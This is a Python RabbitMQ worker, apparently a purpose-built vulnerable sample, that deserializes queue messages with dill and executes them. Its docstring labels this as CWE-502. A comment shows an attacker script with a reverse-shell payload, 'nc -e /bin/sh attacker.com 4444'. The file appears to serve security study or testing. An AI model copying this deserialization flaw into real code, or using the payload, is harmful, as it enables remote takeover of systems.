import os
import sys
import pika
import dill
import uuid
import sqlite3
import logging
from datetime import datetime

# Configure logging for the Distributed Task Worker
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - TaskWorker - %(levelname)s - %(message)s'
)
logger = logging.getLogger("DistributedWorker")

DB_FILE = "worker_metrics.db"
RABBITMQ_HOST = os.getenv("RABBITMQ_HOST", "localhost")
QUEUE_NAME = "analytics_compute_tasks"

def init_metrics_db():
    """Initializes the SQLite database for tracking task execution metrics."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE task_metrics (
            task_id TEXT PRIMARY KEY,
            executed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            status TEXT NOT NULL,
            execution_time_ms INTEGER,
            error_details TEXT
        )
    ''')
    
    # Pre-populate with historical mock metrics
    mock_metrics = [
        ('task_abc123', datetime.now().isoformat(), 'SUCCESS', 450, ''),
        ('task_def456', datetime.now().isoformat(), 'FAILED', 12, 'MemoryError')
    ]
    cursor.executemany('''
        INSERT INTO task_metrics (task_id, executed_at, status, execution_time_ms, error_details)
        VALUES (?, ?, ?, ?, ?)
    ''', mock_metrics)
    
    conn.commit()
    conn.close()
    logger.info("Worker metrics database initialized.")

def log_task_metric(task_id: str, status: str, duration: int, error: str = ""):
    """Records the outcome of a distributed task execution."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO task_metrics (task_id, status, execution_time_ms, error_details) VALUES (?, ?, ?, ?)",
            (task_id, status, duration, error)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Failed to log task metric {task_id}: {e}")

def execute_serialized_lambda(task_payload: bytes, task_id: str) -> bool:
    """
    VULNERABLE FUNCTION: CWE-502 Deserialization of Untrusted Data
    Trigger Path: RabbitMQ Message Payload (dill serialized Python object/closure)
    """
    logger.info(f"[{task_id}] Deserializing analytic compute task.")
    start_time = datetime.now()
    
    try:
        # Vulnerability: The application uses 'dill' (a powerful extension of pickle) 
        # to deserialize and execute arbitrary Python closures sent over the RabbitMQ queue.
        # Dill is designed to serialize lambda functions and complex object states, making 
        # it inherently unsafe for untrusted inputs. An attacker publishing to the queue
        # can execute arbitrary system commands automatically when the payload is unpickled.
        
        # CWE-502 occurs instantly during the loads() operation.
        task_function = dill.loads(task_payload)
        
        if callable(task_function):
            logger.debug(f"[{task_id}] Task deserialized successfully. Executing function...")
            # The deserialized function is executed within the worker's context
            result = task_function()
            logger.info(f"[{task_id}] Task completed with result: {result}")
        else:
            logger.warning(f"[{task_id}] Deserialized payload is not a callable function.")
            
        duration = int((datetime.now() - start_time).total_seconds() * 1000)
        log_task_metric(task_id, "SUCCESS", duration)
        return True
            
    except Exception as e:
        duration = int((datetime.now() - start_time).total_seconds() * 1000)
        logger.error(f"[{task_id}] Error during task execution: {e}")
        log_task_metric(task_id, "FAILED", duration, str(e))
        return False

def on_message_received(ch, method, properties, body):
    """Callback for when a message is consumed from the RabbitMQ queue."""
    task_id = properties.correlation_id or f"task_{uuid.uuid4().hex[:8]}"
    logger.info(f"Received new compute task: {task_id}")
    
    # Pass the untrusted raw byte payload from RabbitMQ to the vulnerable function
    success = execute_serialized_lambda(body, task_id)
    
    if success:
        logger.info(f"[{task_id}] Acknowledging message.")
        ch.basic_ack(delivery_tag=method.delivery_tag)
    else:
        logger.warning(f"[{task_id}] Rejecting message due to failure.")
        # Reject and do not requeue to avoid poison message loops
        ch.basic_reject(delivery_tag=method.delivery_tag, requeue=False)

def start_worker():
    """Configures and starts the Pika RabbitMQ consumer loop."""
    init_metrics_db()
    
    try:
        connection = pika.BlockingConnection(
            pika.ConnectionParameters(host=RABBITMQ_HOST)
        )
        channel = connection.channel()
        
        # Ensure the queue exists
        channel.queue_declare(queue=QUEUE_NAME, durable=True)
        
        # Only prefetch one task at a time per worker
        channel.basic_qos(prefetch_count=1)
        
        channel.basic_consume(
            queue=QUEUE_NAME, 
            on_message_callback=on_message_received
        )
        
        # Example Malicious Trigger (published by an attacker via pika producer script):
        # import pika, dill, os
        # payload = dill.dumps(lambda: os.system('nc -e /bin/sh attacker.com 4444'))
        # connection = pika.BlockingConnection(pika.ConnectionParameters('localhost'))
        # channel = connection.channel()
        # channel.basic_publish(exchange='', routing_key='analytics_compute_tasks', body=payload)
        
        logger.info(f"Waiting for analytical tasks on '{QUEUE_NAME}'. To exit press CTRL+C")
        channel.start_consuming()
        
    except pika.exceptions.AMQPConnectionError:
        logger.error(f"Could not connect to RabbitMQ broker at {RABBITMQ_HOST}")
        sys.exit(1)
    except KeyboardInterrupt:
        logger.info("Worker shutting down gracefully.")
        if 'connection' in locals() and connection.is_open:
            connection.close()

if __name__ == "__main__":
    start_worker()
